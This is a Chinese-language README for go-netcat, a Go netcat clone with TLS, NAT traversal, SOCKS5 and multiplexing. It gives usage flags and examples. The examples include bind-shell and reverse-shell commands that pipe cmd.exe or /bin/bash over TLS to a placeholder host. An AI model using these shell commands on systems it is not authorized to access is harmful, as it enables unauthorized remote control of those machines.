## go-netcat 简介

golang版 netcat,有以下特点：

   - -exec结合-keep-open可为实现每个连接提供指定服务程序，-exec执行的程序将基于stdio管道提供服务。如果是/bin/sh这种shell程序，还可以加上-pty启用pseudo-terminal模式
   - 控制台输入支持raw模式，特别是获得shell的操作时支持TAB、ctrl+c等输入
   - 引入了cloudflare的turn服务探测公网地址，-turn方便查看自身地址经过NAT后的公网地址
   - TCP/UDP两种都很方便实现内网对内网的穿透NAT建立点对点的通信，用-peer参数可方便NAT打洞
   - 引入KCP方便建立稳定传输的UDP通道
   - 自身可作为-exec的服务程序，然后基于多路复用隧道的功能提供流量转发或socks5代理
   - TLS/DTLS针对TCP/UDP都支持
   - 支持针对发送或接收统计传输速度

## 使用方法
```
Usage of ./gonc:
  -C    enable CRLF
  -app-mux
        a Stream Multiplexing based proxy app
  -auth string
        user:password for SOCKS5 proxy; preshared key for kcp
  -bind string
        ip:port
  -exec string
        runs a command for each connection
  -inprogress
        show transfer progress
  -kcp
        use UDP+KCP protocol, -u can be omitted
  -keep-open
        keep listening after client disconnects
  -keepalive int
        none 0 will enable TCP keepalive feature
  -l    listen mode
  -mux-address string
        host:port (for connect or listen mode)
  -mux-engine string
        yamux | smux (default "smux")
  -mux-mode string
        connect | listen | stdio (default "stdio")
  -outprogress
        show transfer progress
  -peer string
        peer address to connect, will send a ping/SYN for NAT punching
  -pty
        <-exec> will run in a pseudo-terminal, and put the terminal into raw mode
  -punchdata string
        UDP punch payload (default "ping\n")
  -s5 string
        ip:port (SOCKS5 proxy)
  -sendfile string
        path to file to send (optional)
  -sni string
        specify TLS SNI
  -stderr
        when -exec, Merge stderr into stdout
  -tls
        Enable TLS connection
  -tls10
        force negotiation to specify TLS version
  -tls11
        force negotiation to specify TLS version
  -tls12
        force negotiation to specify TLS version
  -tls13
        force negotiation to specify TLS version
  -tlsserver
        force as TLS server while connecting
  -turn
        use STUN to discover public IP
  -turnsrv string
        turn server (default "turn.cloudflare.com:3478")
  -u    use UDP protocol
```

## 例子

- 支持使用socks5代理

    `gonc.exe -s5 s.s.s.s:port x.x.x.x 1234`

- 支持监听或反弹shell
    
    监听

    `gonc.exe -tls -keep-open -exec cmd.exe -stderr -l 1234`

    反弹

    `gonc.exe -tls -exec cmd.exe -stderr x.x.x.x 1234`

- 类UNIX支持pseudo-terminal shell 

    监听

    `gonc -tls -pty -exec /bin/bash -l 1234`

    连接获得shell(windows和linux都支持console raw模式，该模式下支持TAB、ctrl+c等输入)

    gonc.exe -tls -pty x.x.x.x 1234

- 还可以像socat那样建立左右两个通道转发数据

    `gonc.exe -keep-open -exec "./gonc -tls www.baidu.com 443" -l 8000`
    
    另一端用

    `gonc.exe 127.0.0.1 8000 > NUL`

- 发送和统计传输速度，内置/dev/zero和/dev/urandom实现，这样windows下也可以用/dev/zero和/dev/urandom

    `gonc.exe -sendfile /dev/zero -outprogress x.x.x.x 1234`

    `13040386048 bytes (12.1 GiB) copied, 00:00:04, 2.6 GiB/s`

    另一端用

    `gonc.exe -l 1234 > NUL`
